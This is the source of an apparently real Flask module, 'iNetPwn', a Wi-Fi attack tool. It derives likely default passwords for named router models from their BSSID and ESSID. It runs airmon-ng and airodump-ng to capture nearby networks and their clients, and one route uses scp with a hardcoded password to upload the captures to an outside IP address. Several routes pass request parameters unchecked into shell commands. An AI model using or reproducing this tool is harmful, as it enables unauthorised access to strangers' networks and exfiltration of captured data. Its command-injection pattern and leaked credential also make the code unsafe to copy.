from flask import Blueprint, jsonify, redirect, render_template, request
import os, re, time
from subprocess import Popen

iNetPwn = Blueprint("iNetPwn", __name__, template_folder = "templates")

def possiblePassword(bssid, essid, encryption, manuf):
    if encryption and encryption[0] == "None": return "Open"
    if essid[:6] in ["DG860A", "TG862G"]: return essid[:6] + "".join(bssid.split(":")[3:5]) + essid[6:8]
    if essid[:7] in ["DG1670A", "TC8715D", "TC8717T", "TG1672G"]: return essid[:7] + "".join(bssid.split(":")[3:5]) + essid[7:9]
    if essid[:7] in ["DDW3611", "SBG6580"]: return essid[:7] + "".join(bssid.split(":")[3:])
    if "ATT-HOMEBASE-" in essid and len(essid) == 17: return "8-digits"
    if "belkin." in essid and (len(essid) == 10 or len(essid) == 11):
        mac8 = bssid.split(":")[-4:]; mac8[3] = hex(int(mac8[3], base = 16) + 1)[2:].upper()
        scramble8 = mac8[2][1] + mac8[0][1] + mac8[1][0] + mac8[3][1] + mac8[2][0] + mac8[0][0] + mac8[3][0] + mac8[1][1]
        conversion_chart = ("0123456789ABCDEF", "944626378ace9bdf"); cracked_string = ""
        for char in scramble8:
            cracked_string += conversion_chart[1][conversion_chart[0].index(char)]
        return cracked_string
    if "Belkin." in essid and (len(essid) == 11 or len(essid) == 13):
        mac8 = bssid.split(":")[-4:]
        conversion_chart = ("0123456789ABCDEF", "024613578ACE9BDF")
        scramble8 = mac8[2][1] + mac8[0][1] + mac8[1][0] + mac8[3][1] + mac8[2][0] + mac8[0][0] + mac8[3][0] + mac8[1][1]
        cracked_string = ""
        for char in scramble8:
            cracked_string += conversion_chart[1][conversion_chart[0].index(char)]
        return cracked_string
    if "DDW365." in essid and len(essid) == 18: return "S/N"
    if "Fios-" in essid and len(essid) == 9 and essid[5:9] == essid[5:9].upper(): return "noun+3-digits+noun+2-digits+noun"
    if "Fios-" in essid and len(essid) == 10 and essid[5:10] == essid[5:10].upper(): return "adj+4-digits+noun+2-digits+noun"
    if "FiOS-" in essid and len(essid) >= 10 and essid[5:10] == essid[5:10].upper(): return "adj+4-digits+noun+3-digits"
    if essid[:7] in ["IBR1100", "IBR200-", "IBR600-", "IBR900-"] and (len(essid) == 10 or len(essid) == 11): return "".join(bssid.split(":")[2:]).lower()
    if "Linksys" in essid and len(essid) >= 12: return "vivint" + essid[7:12]
    if "MySpectrumWiFi" in essid and len(essid) == 19: return "adj+noun+3-digits"
    if "NETGEAR" in essid and len(essid) == 9: return "adj+noun+3-digits"
    if "ORBI" in essid and len(essid) == 6 and essid == essid.upper(): return "adj+noun+3-digits"
    if "SpectrumSetup-" in essid and len(essid) == 16: return "noun+verb+3-digits"
    if "TP-LINK_" in essid and len(essid) == 14: return "".join(bssid.split(":")[2:])
    if "WIFI-" in essid and len(essid) == 9 and essid == essid.upper(): return "8-digits"
    if "WIFI" in essid and len(essid) == 10 and essid == essid.upper(): return "16-chars [A-Z,0-9]"
    if manuf == "Actiontec Electronics, Inc" and len(essid) == 5 and essid == essid.upper(): return "16-chars [A-Z,0-9]"
    if manuf == "ARRIS Group, Inc." and essid[:7] not in ["DG1670A", "TC8715D", "TC8717T", "TG1672G"] and "WPA+TKIP" not in encryption:
        return "TG1672G" + "".join(bssid.split(":")[3:5]) + str(hex(int(bssid.split(":")[-1], base = 16) + 2)).replace("x", "").upper() + \
            "<br>" + "DG1670A" + "".join(bssid.split(":")[3:5]) + str(hex(int(bssid.split(":")[-1], base = 16) + 2)).replace("x", "").upper()
    if manuf == "CradlePoint, Inc": return "".join(bssid.split(":")[2:]).lower()
    if manuf == "Technicolor CH USA Inc." and essid[:7] not in ["DG1670A", "TC8715D", "TC8717T", "TG1672G"]:
        return "DG1670A" + "".join(bssid.split(":")[3:5]) + str(hex(int(bssid.split(":")[-1], base = 16) - 6)).replace("x", "").upper() + \
            "<br>" + "TC8715D" + "".join(bssid.split(":")[3:5]) + str(hex(int(bssid.split(":")[-1], base = 16) - 6)).replace("x", "").upper() + \
            "<br>" + "TC8717T" + "".join(bssid.split(":")[3:5]) + str(hex(int(bssid.split(":")[-1], base = 16) - 6)).replace("x", "").upper()
    return ""

def xmlParser(netxml):
    if not netxml: return False
    netxml_file = " ".join(open(netxml).read().split())
    networks = re.findall(re.compile("<wireless-network (.*?)</wireless-network>"), netxml_file)
    wireless_networks = []; unique_bssids = []
    for network in networks:
        ssid = re.findall(re.compile("<SSID (.*?)</SSID>"), network)[0] if re.findall(re.compile("<SSID (.*?)</SSID>"), network) else ""
        encryption = re.findall(re.compile("<encryption>(.*?)</encryption>"), ssid)
        essid = re.findall(re.compile('<essid cloaked="(.*?)">'), network)
        essid = re.findall(re.compile('<essid cloaked="false">(.*?)</essid>'), network)[0] if essid and essid[0] == "false" else "(Hidden Network)"
        bssid = re.findall(re.compile("<BSSID>(.*?)</BSSID>"), network)[0].upper()
        manuf = re.findall(re.compile("<manuf>(.*?)</manuf>"), network)[0]
        channel = re.findall(re.compile("<channel>(.*?)</channel>"), network)[0]; channel = " " + channel if len(channel) == 1 else channel
        signal = re.findall(re.compile("<last_signal_dbm>(.*?)</last_signal_dbm>"), network)[0]; signal = "-100" if signal == "0" else signal
        wireless_clients = re.findall(re.compile("<wireless-client (.*?)</wireless-client>"), network)
        client_macs = []; client_manufs = []; clients = []
        if wireless_clients:
            for client in wireless_clients:
                client_macs.append(re.findall(re.compile("<client-mac>(.*?)</client-mac>"), client))
                client_manufs.append(re.findall(re.compile("<client-manuf>(.*?)</client-manuf>"), client))
            for i in range(len(wireless_clients)):
                clients.append([client_macs[i], client_manufs[i]])
        wireless_networks.append({
            "BSSID": bssid, "Channel" : channel, "Clients": clients,
            "Encryption": encryption, "ESSID": essid, "Manuf": manuf, "Signal": signal,
            "PossiblePassword": possiblePassword(bssid, essid, encryption, manuf),
            "NS": netxml.split("_")[1], "EW": netxml.split("_")[2].replace("-01.kismet.netxml", ""),
            "TS": netxml.split("_")[0][netxml.split("_")[0].rindex("/") + 1:]
        })
    return wireless_networks

@iNetPwn.route("/iNetPwn/")
def iNetPwn_index():
    bssid = request.args.get("b"); essid = request.args.get("e")
    if essid and bssid:
        bssid = bssid.upper()
        if (len(bssid.split(":")) == 6 and len("".join(bssid.split(":"))) == 12) or (len(bssid) == 12):
            bssid = ":".join([bssid[i:i+2] for i in range(0, len(bssid), 2)]) if len(bssid) == 12 else bssid
            password = possiblePassword(bssid, essid, "", "")
            results = ""
            if password:
                result = "Try This Password: %s" % password if password else result
                return render_template("iNetPwn/index.html", result = result)
            return "Error: Not A Generic Router"
        return "Error: Not A Generic Router"
    elif not essid and bssid:
        return "Error: Missing Network Name (ESSID)"
    elif essid and not bssid:
        return "Error: Missing Access Point (BSSID)"
    else:
        return render_template("iNetPwn/index.html")

@iNetPwn.route("/iNetPwn/getInterface")
def iNetPwn_getInterfaces():
    i = request.args.get("i"); s = request.args.get("s")
    if i and s:
        os.system("airmon-ng %s %s > /dev/null 2>&1" % ("start" if s == "1" else "stop", i))
        if "mon" in i and s == "1":
            ns = request.args.get("ns"); ew = request.args.get("ew"); t = request.args.get("t")
            path = "/var/www/RC/RC/static/iNetPwn/listener"
            os.system("mkdir %s > /dev/null 2>&1" % path)
            p = Popen(list(("timeout %ss airodump-ng %s --output-format cap,netxml -w %s/%s_%s_%s" % (t, i, path, time.strftime("%Y%m%d%H%M%S"), ns, ew)).split(" ")))
        return jsonify("")
    return jsonify("")

@iNetPwn.route("/iNetPwn/parseXMLs")
def iNetPwn_parseXMLs():
    os.system("mkdir /var/www/RC/RC/static/iNetPwn/listener > /dev/null 2>&1")
    os.system("ls /var/www/RC/RC/static/iNetPwn/listener/*.netxml > /var/www/RC/RC/static/iNetPwn/listener/ls")
    ls = open("/var/www/RC/RC/static/iNetPwn/listener/ls"); networks = []; wireless_networks = {}
    for line in ls: networks += xmlParser(line.replace("\n", ""))
    for network in networks:
        if network["BSSID"] not in wireless_networks.keys(): wireless_networks[network["BSSID"]] = network
        else:
            wireless_networks[network["BSSID"]]["Clients"] += network["Clients"]
            if (abs(int(network["Signal"])) < abs(int(wireless_networks[network["BSSID"]]["Signal"]))):
                wireless_networks[network["BSSID"]]["Signal"] = network["Signal"]
                wireless_networks[network["BSSID"]]["NS"] = network["NS"]
                wireless_networks[network["BSSID"]]["EW"] = network["EW"]
                wireless_networks[network["BSSID"]]["TS"] = network["TS"]
            if wireless_networks[network["BSSID"]]["ESSID"] == "(Hidden Network)":
                if network["ESSID"] != "(Hidden Network)":
                    wireless_networks[network["BSSID"]]["ESSID"] = network["ESSID"]
                    wireless_networks[network["BSSID"]]["PossiblePassword"] = network["PossiblePassword"]
                    wireless_networks[network["BSSID"]]["Encryption"] = network["Encryption"]
                    wireless_networks[network["BSSID"]]["Manuf"] = network["Manuf"]
        clients = []
        for client in wireless_networks[network["BSSID"]]["Clients"]:
            if client not in clients: clients.append(client)
        wireless_networks[network["BSSID"]]["Clients"] = clients
    return jsonify(wireless_networks)

@iNetPwn.route("/iNetPwn/uploadXMLs")
def iNetPwn_uploadXMLs():
    os.system("exp herewasi13 scp -r /var/www/RC/RC/static/iNetPwn/listener 45.55.210.48:/var/www/RC/RC/static/iNetPwn/")
    return jsonify({"success": 1})

@iNetPwn.route("/iNetPwn/NetworkMap", methods = ["GET", "POST"])
def iNetPwn_NetworkMap():
    os.system("ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' > /var/www/RC/RC/static/iNetPwn/ifconfig")
    ifconfig = open("/var/www/RC/RC/static/iNetPwn/ifconfig").read(); os.system("rm /var/www/RC/RC/static/iNetPwn/ifconfig")
    os.system("mkdir /var/www/RC/RC/static/iNetPwn/listener > /dev/null 2>&1")
    os.system("ls /var/www/RC/RC/static/iNetPwn/listener/*.netxml > /var/www/RC/RC/static/iNetPwn/listener/ls")
    ls = open("/var/www/RC/RC/static/iNetPwn/listener/ls"); netxmls = []
    for line in ls:
        if len(re.sub("[^_]", "", line)) == 2:
            f = line[line.rindex("/") + 1:].replace("\n", ""); params = filter(None, f.replace("-01.kismet.netxml", "").split("_")); netxmls.append([f, params])
    return render_template("iNetPwn/NetworkMap.html", netxmls = netxmls, host = ifconfig if len(ifconfig.split(".")) == 4 else 0)

@iNetPwn.route("/iNetPwn/GPS", methods = ["GET", "POST"])
def iNetPwn_GPS():
    os.system("ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' > /var/www/RC/RC/static/iNetPwn/ifconfig")
    ifconfig = open("/var/www/RC/RC/static/iNetPwn/ifconfig").read(); os.system("rm /var/www/RC/RC/static/iNetPwn/ifconfig")
    if request.args.get("h"):
        host = re.sub("[^0-9\.]", "", request.args.get("h"))
        if host in ifconfig:
            os.system("airmon-ng | grep wlan > airmon-ng.txt")
            airmon_txt = open("airmon-ng.txt"); os.system("rm airmon-ng.txt")
            interfaces = []; mon = 0
            for line in airmon_txt:
                data = line.split(); data[3] = " ".join(data[3:])
                mon = 1 if "mon" in data[1] else mon
                interfaces.append([data[1], data[2], data[3]])
            return render_template("iNetPwn/GPS.html", connected = 1, interfaces = interfaces[::-1], mon = mon)
        return redirect("https://%s:5000/iNetPwn/GPS?h=%s" % (host, host))
    return render_template("iNetPwn/GPS.html", host = ifconfig if len(ifconfig.split(".")) == 4 else "172.20.10.13")
